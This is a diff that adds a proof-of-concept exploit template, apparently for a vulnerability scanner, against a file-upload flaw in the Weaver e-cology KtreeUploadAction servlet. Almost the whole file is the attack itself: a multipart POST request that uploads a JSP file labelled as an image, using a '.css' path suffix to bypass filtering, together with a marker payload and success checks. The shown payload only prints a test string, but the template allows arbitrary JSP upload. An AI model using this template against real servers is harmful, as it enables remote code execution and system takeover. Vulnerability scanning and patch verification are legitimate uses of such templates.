@@ -1,0 +1,21 @@
+﻿<DudePoc_Name>泛微 e-cology KtreeUploadAction 存在文件上传漏洞</DudePoc_Name>
+<DudePoc_Description>上海泛微网络科技股份有限公司ecology /com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction 存在文件上传漏洞，攻击者可利用该漏洞获取系统权限。</DudePoc_Description>
+<DudePoc_SetHeader>
+POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction/.css?action=image HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+Content-Type: multipart/form-data; boundary=ce2c603de19573a853c8facc8cf14425
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+--ce2c603de19573a853c8facc8cf14425
+Content-Disposition: form-data; name="files"; filename="123456.jsp"
+Content-Type: image/jpeg
+
+$<AttackCode>$
+--ce2c603de19573a853c8facc8cf14425--
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>hello2022</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode><%out.println("hello2022 ! world2022");%></DudePoc_AttackCode>
